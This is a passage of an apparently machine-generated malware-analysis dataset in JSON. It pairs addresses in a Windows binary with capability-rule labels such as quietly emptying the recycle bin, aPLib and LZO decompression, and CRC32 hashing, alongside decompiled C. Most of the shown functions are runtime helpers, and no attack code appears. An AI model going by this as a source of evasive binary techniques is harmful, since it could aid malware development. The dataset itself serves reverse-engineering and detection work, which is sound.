code_r0x0049d532;\n}\n",
        "token_count": 854
    },
    "00405ddf": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.00405ddf(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.00403d28();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049cbf4:\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n        }\n        else {\n            do {\n                cVar1 = fcn.0040450c();\n                if (cVar1 == '\\0') {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049cca8:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049ccbb;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.00401299(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n                    cVar1 = fcn.00401c80();\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n    // switch table (8 cases) at 0x49cce4\n                    switch(*(param_1 + 0x1c)) {\n                    case 0:\n                        cVar1 = fcn.00405777();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049cca8;\n                    case 2:\n                        cVar1 = fcn.00405722();\n                        break;\n                    case 3:\n                        cVar1 = fcn.00401055();\n                        break;\n                    case 4:\n                        goto code_r0x0049cc82;\n                    case 5:\n                        cVar1 = fcn.00403c6a();\n                        break;\n                    case 6:\n                        cVar1 = fcn.00405c3b();\n                        break;\n                    case 7:\n                        cVar1 = fcn.004035d5(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049cc07;\n                    default:\n                        goto code_r0x0049cbf4;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049cca8;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\ncode_r0x0049ccbb:\n                cVar1 = fcn.00401d16();\n            } while (cVar1 != '\\0');\n        }\n    }\ncode_r0x0049cc07:\n    return 0xffffffff;\ncode_r0x0049cc82:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049cca8;\n}\n",
        "token_count": 972
    },
    "00401820": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.00401820(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    \n    uVar3 = param_1;\n    uVar8 = param_4;\n    uVar6 = param_2;\n    uVar9 = param_3;\n    if (param_4 == 0) {\n        uVar3 = param_2 / param_3;\n        iVar4 = (param_2 % param_3 << 0x20 | param_1) / param_3;\n    }\n    else {\n        do {\n            uVar5 = uVar8 >> 1;\n            uVar9 = uVar9 >> 1 | ((uVar8 & 1) != 0) << 0x1f;\n            uVar7 = uVar6 >> 1;\n            uVar3 = uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f;\n            uVar8 = uVar5;\n            uVar6 = uVar7;\n        } while (uVar5 != 0);\n        uVar1 = CONCAT44(uVar7, uVar3) / uVar9;\n        iVar4 = uVar1;\n        iVar2 = param_3 * (uVar1 & 0xffffffff);\n        uVar3 = iVar2 >> 0x20;\n        uVar8 = uVar3 + iVar4 * param_4;\n        if (((CARRY4(uVar3, iVar4 * param_4)) || (param_2 < uVar8)) || ((param_2 <= uVar8 && (param_1 < iVar2)))) {\n            iVar4 = iVar4 + -1;\n        }\n        uVar3 = 0;\n    }\n    return CONCAT44(uVar3, iVar4);\n}\n",
        "token_count": 472
    },
    "00401d39": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401d39(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2b05;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2b05:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 313
    },
    "00401e29": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401e29(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    arg_8h = arg_8h | 7;\n    if (((arg_8h <= arg_10h) && (arg_ch <= arg_10h - (arg_ch >> 1))) &&\n       (arg_10h = (arg_ch >> 1) + arg_ch,  arg_10h <= arg_8h)) {\n        arg_10h = arg_8h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 132
    },
    "00402905": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402905(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2f58;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2f58:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 311
    },
    "00402da1": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402da1(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2ce6;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2ce6:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 312
    },
    "004035b7": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004035b7(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_bp_4h;\n    \n    var_8h = arg_8h | 7;\n    if (arg_10h < var_8h) {\n        var_bp_4h = arg_10h;\n    }\n    else if (arg_10h - (arg_ch >> 1) < arg_ch) {\n        var_bp_4h = arg_10h;\n    }\n    else {\n        var_ch = arg_ch + (arg_ch >> 1);\n        puVar1 = fcn.00405e34(&var_8h, &var_ch);\n        var_bp_4h = *puVar1;\n    }\n    return var_bp_4h;\n}\n",
        "token_count": 211
    },
    "00403fc6": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00403fc6(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.004061ae(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.00404331();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2d6f;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2d6f:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 375
    },
    "00404840": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.00404840(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    \n    uVar3 = param_1;\n    uVar8 = param_4;\n    uVar6 = param_2;\n    uVar9 = param_3;\n    if (param_4 == 0) {\n        uVar3 = param_2 / param_3;\n        iVar4 = (param_2 % param_3 << 0x20 | param_1) / param_3;\n    }\n    else {\n        do {\n            uVar5 = uVar8 >> 1;\n            uVar9 = uVar9 >> 1 | ((uVar8 & 1) != 0) << 0x1f;\n            uVar7 = uVar6 >> 1;\n            uVar3 = uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f;\n            uVar8 = uVar5;\n            uVar6 = uVar7;\n        } while (uVar5 != 0);\n        uVar1 = CONCAT44(uVar7, uVar3) / uVar9;\n        iVar4 = uVar1;\n        iVar2 = param_3 * (uVar1 & 0xffffffff);\n        uVar3 = iVar2 >> 0x20;\n        uVar8 = uVar3 + iVar4 * param_4;\n        if (((CARRY4(uVar3, iVar4 * param_4)) || (param_2 < uVar8)) || ((param_2 <= uVar8 && (param_1 < iVar2)))) {\n            iVar4 = iVar4 + -1;\n        }\n        uVar3 = 0;\n    }\n    return CONCAT44(uVar3, iVar4);\n}\n",
        "token_count": 472
    },
    "00404ab6": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00404ab6(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.00404822(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.004059b1();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2ee0;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2ee0:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 374
    },
    "00404c7d": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404c7d(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2a04;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2a04:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 314
    },
    "00404f52": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404f52(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2b75;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2b75:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 313
    },
    "00405731": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405731(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_bp_4h;\n    \n    var_8h = arg_8h | 0xf;\n    if (arg_10h < var_8h) {\n        var_bp_4h = arg_10h;\n    }\n    else if (arg_10h - (arg_ch >> 1) < arg_ch) {\n        var_bp_4h = arg_10h;\n    }\n    else {\n        var_ch = arg_ch + (arg_ch >> 1);\n        puVar1 = fcn.00405e34(&var_8h, &var_ch);\n        var_bp_4h = *puVar1;\n    }\n    return var_bp_4h;\n}\n",
        "token_count": 211
    },
    "00405e16": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.00405e16(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    bool bVar10;\n    char cVar11;\n    uint32_t uVar9;\n    \n    cVar11 = param_2 < 0;\n    if (cVar11) {\n        bVar10 = param_1 != 0;\n        param_1 = -param_1;\n        param_2 = -bVar10 - param_2;\n    }\n    if (param_4 < 0) {\n        cVar11 = cVar11 + '\\x01';\n        bVar10 = param_3 != 0;\n        param_3 = -param_3;\n        param_4 = -bVar10 - param_4;\n    }\n    uVar3 = param_1;\n    uVar5 = param_3;\n    uVar6 = param_2;\n    uVar9 = param_4;\n    if (param_4 == 0) {\n        uVar3 = param_2 / param_3;\n        iVar4 = (param_2 % param_3 << 0x20 | param_1) / param_3;\n    }\n    else {\n        do {\n            uVar8 = uVar9 >> 1;\n            uVar5 = uVar5 >> 1 | ((uVar9 & 1) != 0) << 0x1f;\n            uVar7 = uVar6 >> 1;\n            uVar3 = uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f;\n            uVar6 = uVar7;\n            uVar9 = uVar8;\n        } while (uVar8 != 0);\n        uVar1 = CONCAT44(uVar7, uVar3) / uVar5;\n        iVar4 = uVar1;\n        iVar2 = param_3 * (uVar1 & 0xffffffff);\n        uVar3 = iVar2 >> 0x20;\n        uVar5 = uVar3 + iVar4 * param_4;\n        if (((CARRY4(uVar3, iVar4 * param_4)) || (param_2 < uVar5)) || ((param_2 <= uVar5 && (param_1 < iVar2)))) {\n            iVar4 = iVar4 + -1;\n        }\n        uVar3 = 0;\n    }\n    if (cVar11 == '\\x01') {\n        bVar10 = iVar4 != 0;\n        iVar4 = -iVar4;\n        uVar3 = -bVar10 - uVar3;\n    }\n    return CONCAT44(uVar3, iVar4);\n}\n",
        "token_count": 652
    },
    "00405e8e": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405e8e(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2c76;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2c76:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 314
    },
    "00405f65": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00405f65(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.00401bf4(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.00406622();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2a8d;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2a8d:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 377
    },
    "00406168": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.00406168(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    bool bVar10;\n    char cVar11;\n    uint32_t uVar9;\n    \n    cVar11 = param_2 < 0;\n    if (cVar11) {\n        bVar10 = param_1 != 0;\n        param_1 = -param_1;\n        param_2 = -bVar10 - param_2;\n    }\n    if (param_4 < 0) {\n        cVar11 = cVar11 + '\\x01';\n        bVar10 = param_3 != 0;\n        param_3 = -param_3;\n        param_4 = -bVar10 - param_4;\n    }\n    uVar3 = param_1;\n    uVar5 = param_3;\n    uVar6 = param_2;\n    uVar9 = param_4;\n    if (param_4 == 0) {\n        uVar3 = param_2 / param_3;\n        iVar4 = (param_2 % param_3 << 0x20 | param_1) / param_3;\n    }\n    else {\n        do {\n            uVar8 = uVar9 >> 1;\n            uVar5 = uVar5 >> 1 | ((uVar9 & 1) != 0) << 0x1f;\n            uVar7 = uVar6 >> 1;\n            uVar3 = uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f;\n            uVar6 = uVar7;\n            uVar9 = uVar8;\n        } while (uVar8 != 0);\n        uVar1 = CONCAT44(uVar7, uVar3) / uVar5;\n        iVar4 = uVar1;\n        iVar2 = param_3 * (uVar1 & 0xffffffff);\n        uVar3 = iVar2 >> 0x20;\n        uVar5 = uVar3 + iVar4 * param_4;\n        if (((CARRY4(uVar3, iVar4 * param_4)) || (param_2 < uVar5)) || ((param_2 <= uVar5 && (param_1 < iVar2)))) {\n            iVar4 = iVar4 + -1;\n        }\n        uVar3 = 0;\n    }\n    if (cVar11 == '\\x01') {\n        bVar10 = iVar4 != 0;\n        iVar4 = -iVar4;\n        uVar3 = -bVar10 - uVar3;\n    }\n    return CONCAT44(uVar3, iVar4);\n}\n",
        "token_count": 651
    },
    "00406244": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406244(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2de7;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2de7:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 311
    },
    "00406690": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00406690(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.00405592(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.004051cd();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2bfe;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2bfe:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 373
    },
    "004069fb": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004069fb(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a2e57;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a2e57:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 311
    },
    "00404796": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.00404796(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    char **ppcVar10;\n    char **arg_8h_00;\n    char **var_28h;\n    char **var_24h;\n    uint var_20h;\n    char **var_1ch;\n    char *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char **var_8h;\n    char *var_4h;\n    \n    if (arg_ch == NULL) {\n        puVar3 = fcn.00403a35();\n        iVar8 = 0x16;\n        *puVar3 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        pcVar7 = NULL;\n        *arg_ch = 0;\n        iVar8 = *arg_8h;\n        var_28h = NULL;\n        var_24h = NULL;\n        var_20h = 0;\n        ppcVar10 = var_28h;\n        while (var_28h = ppcVar10,  iVar8 != 0) {\n            var_4h = CONCAT13(var_4h >> 0x18, 0x3f2a);\n            iVar8 = fcn.00402b58(iVar8, &var_4h);\n            if (iVar8 == 0) {\n                iVar8 = fcn.004c6bf6(*arg_8h, 0, 0, &var_28h);\n            }\n            else {\n                iVar8 = fcn.004c6db4(*arg_8h, iVar8, &var_28h);\n            }\n            ppcVar10 = var_28h;\n            var_8h = iVar8;\n            if (iVar8 != 0) goto code_r0x004c687a;\n            arg_8h = arg_8h + 1;\n            iVar8 = *arg_8h;\n        }\n        var_4h = NULL;\n        var_ch = (var_24h - ppcVar10 >> 2) + 1;\n        uVar9 = ~-(var_24h < ppcVar10) & (var_24h - ppcVar10) + 3U >> 2;\n        var_8h = ppcVar10;\n        if (uVar9 != 0) {\n            uVar6 = 0;\n            do {\n                pcVar5 = *var_8h;\n                var_10h = pcVar5 + 1;\n                do {\n                    cVar1 = *pcVar5;\n                    pcVar5 = pcVar5 + 1;\n                } while (cVar1 != '\\0');\n         